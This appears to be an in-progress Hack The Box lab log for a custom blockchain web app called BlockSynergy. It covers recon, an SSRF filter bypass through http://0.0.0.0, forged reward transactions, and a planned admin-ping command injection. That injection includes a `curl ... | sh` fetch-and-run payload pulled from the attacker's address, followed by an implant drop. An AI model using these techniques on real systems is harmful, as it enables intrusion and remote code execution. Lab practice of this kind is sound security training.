# BlockSynergy — progress

| Field | Value |
|---|---|
| Machine | BlockSynergy (HTB, Insane Linux) |
| Target | `10.129.115.120` (prior `10.129.115.113` poisoned; older `10.129.246.236` / `10.129.114.194`) |
| tun0 | `10.10.15.212` |
| Status | VIP live, pending **clean**. Blocked on **localhost POST** `ping_node` (test_node is always GET). No user/root yet. |
| ARK | C implant after foothold; none yet. Teamserver not required for this web chain. |

## Recon

- TCP **22** (SSH), **8080** (Werkzeug 3.1.3 / Python 3.12 Flask). Full port scan: nothing else.
- App: custom blockchain (wallet, mining, VIP node management).
- API: `/blockchain`, `/nodes`, `/mining_data`, `/broadcast_transaction`, `/submit_block`.
- Difficulty prefix `00000`. Blocks after genesis contain **5** txs. Hash formula for stored blocks: `sha256(f"{index}{previous_hash}{timestamp}{json.dumps(data)}{nonce}")` (verified on this spawn).
- Wallet keys are **P-256** (SECP256R1), 32-byte priv / 64-byte uncompressed pub.
- Admin is **source-IP locked** (403 from tun0; no XFF/Host bypass). Localhost SSRF via `http://0.0.0.0:8080/...` works.
- Admin routes seen: `/admin`, `/admin/blockchain` (backup/restore POST), `/admin/blockchain/view`, `/admin/blockchain/validate`, `/admin/nodes/manage` (POST `ping_node` / `remove_node`), `/admin/nodes/add_node`, `/admin/txn/pending`, `/admin/txn/history`, `/admin/system` (POST `systeminfo`).
- VIP `test_node` is `requests.get` (UA `python-requests/2.32.5`). Broadcast does **not** fan-out POST to peers.
- `GET /submit_block` → 500 (endpoint is broken for operators; auto-miner only built blocks 2–3).

## What worked on 10.129.114.194 (before poison)

- Wallet `~/htb-blocksynergy/ark_wallet2.json` (P-256). Forge mint `sender=Blockchain_Reward`, `signature=Blockchain`, `amount=100000` → **pending counts toward VIP balance** (no need to `submit_block`).
- Auto-miner only builds blocks 2–3 then stops. `POST /submit_block` **500 for every JSON body** (valid 5-tx PoW included). Do not rely on it.
- Localhost filter uses `gethostbyname()`; `file://` errors; `127.0.0.1`/`localhost` rejected; **`http://0.0.0.0:8080/...` allowed**.
- VIP `test_node/<id>` is **`requests.get`** (UA `python-requests/2.32.5`). Admin `/admin/nodes/manage` Ping is **POST** `action=ping_node&target=` (shell + URL userinfo; no spaces or `/` in the injection).
- Direct `/admin` from tun0 is 403. SSRF GET of `http://0.0.0.0:8080/admin` returns Admin Dashboard (backup/restore, manage/ping, systeminfo, add_node).
- `gopher://` **registers** but `requests` has no gopher adapter; test_node catches and re-renders VIP. Listener did **not** see a ping. GET `?action=ping_node` does not run ping. POST to `test_node` still outbound-GETs.
- VIP download_blockchain/download_app return the HTML page, not source.

## Blocked now

This instance (`10.129.115.113`) was poisoned again: `POST /broadcast_transaction` of `{"a":1}` while probing `/nodes`. Last pending tx is `{a:1}`. VIP `register` / `test_node` / `pending_txn` all **500**. `GET /submit_block` is also **500** (handler crashes even without a body) so pending cannot be flushed by mining.

Watcher: `~/htb-blocksynergy/watch_reset.sh` (fires when pending has no sender-less txs).
Exploit: `~/htb-blocksynergy/pwn.py` (mint + SSRF + userinfo RCE probes; never broadcasts incomplete txs).

## Next

**Reset the HTB machine**, then run `python3 ~/htb-blocksynergy/pwn.py`. Do **not** POST `{}` or any partial object to `/broadcast_transaction`.

1. Load wallet (multipart field `file=`). Forge mint with timestamp. Wait until pending includes it → VIP.
2. Register `http://0.0.0.0:8080/admin` and `.../admin/nodes/manage`; `test_node` dumps admin HTML.
3. Trigger **admin ping** (POST) on a URL like `http://$(id)@10.10.15.212:1720` — still the missing step (gopher/requests). Then `$(curl${IFS}tun0:port\|sh)` (no spaces `/`).
4. Drop C Linux implant (`ark inbound drop` / httpdrop). Privesc notes: keira → paul `sudo pacman`.

## ARK gaps this eng

| Gap | Workaround | Wanted |
| --- | --- | --- |
| No HTTP/API helper for custom blockchain | curl + python miner | optional |
| Implant needs SSH or httpdrop after RCE | pending foothold | — |
